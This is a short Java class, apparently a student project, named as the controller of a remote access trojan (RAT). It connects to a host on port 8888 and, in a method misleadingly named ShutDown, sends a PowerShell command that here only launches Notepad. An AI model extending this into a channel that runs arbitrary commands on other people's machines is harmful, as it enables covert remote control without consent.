package controllers;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.OutputStream;
import java.net.Socket;

/**
 *
 * @author gbrid
 */
public class RATClientCtr {
    private static final int port = 8888;
    private static String host;
    private static Socket mySocket;
    
    public static void openSocket(String host) {
        try {
            mySocket = new Socket(host, port);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    public static String getResult() {
        String res = "";
        try {
            ObjectInputStream ois = new ObjectInputStream(mySocket.getInputStream());
            res = (String)ois.readObject();
        } catch (Exception e) {
            e.printStackTrace();
        }
        return res;
    }
    
    public static void closeConn() {
        try {
            mySocket.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    public static void ConnectionCtr(String ip) {
        try {
            openSocket(ip);
            //getResult();
            //closeConn();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    public void ShutDown() throws IOException {
        String command = "powershell.exe start-process notepad.exe";
        OutputStream ops = mySocket.getOutputStream();
        DataOutputStream dos = new DataOutputStream(ops);
        dos.writeUTF(command);
        dos.flush();
    }
    
}
